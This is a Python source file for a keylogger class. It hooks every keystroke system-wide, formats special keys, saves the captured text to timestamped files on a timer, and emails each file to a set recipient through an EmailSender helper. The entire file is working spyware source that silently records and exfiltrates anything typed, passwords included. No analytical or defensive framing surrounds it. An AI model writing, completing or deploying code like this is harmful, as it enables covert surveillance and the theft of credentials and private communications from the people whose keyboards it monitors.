# src/models/keylogger_model.py
import keyboard
import logging
from threading import Timer
from datetime import datetime
from models.email_sender import EmailSender

class KeyloggerModel:
    """Handles keylogging functionality."""
    def __init__(self, interval, method="file"):
        self.interval = interval
        self.method = method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.email_sender = EmailSender()

    def on_keydown(self, event):
        name = event.name
        if len(name) > 1:
            name = self.format_special_keys(name)
        self.log += name

    def format_special_keys(self, name):
        """Format special keys for logging."""
        if name == "space":
            return " "
        elif name == "enter":
            return "[ENTER]\n"
        elif name == "decimal":
            return "."
        return f"[{name.upper()}]"

    def define_filename(self):
        """Define the log filename based on start and end times."""
        start_dt_str = self.start_dt.strftime("%Y%m%d-%H%M")
        end_dt_str = self.end_dt.strftime("%Y%m%d-%H%M")
        return f"keylog-{start_dt_str}-{end_dt_str}"

    def save_report_to_file(self):
        filename = self.define_filename()
        with open(f"{filename}.txt", "w") as f:
            f.write(self.log)
        logging.info(f"[+] Saved {filename}.txt")
        return f"{filename}.txt" 
        
    def report_logs(self):
        """Log the keys pressed periodically."""
        if self.log:
            self.end_dt = datetime.now()
            logging.info("Preparing to send email...")

            if self.method == "file":
                attachment = self.save_report_to_file()
                self.email_sender.send_email(self.email_sender.recipient_email_address, 
                                            "Keylogger Report", 
                                            "Attached is the keylogger report.", 
                                            attachment)

            logging.info(f"[{self.define_filename()}] - saved")
            self.start_dt = datetime.now()
        self.log = ""
        Timer(interval=self.interval, function=self.report_logs).start()

    def start(self):
        """Start the keylogger."""
        keyboard.on_press(callback=self.on_keydown)
        self.report_logs()
        logging.info("Keylogger started.")
        keyboard.wait()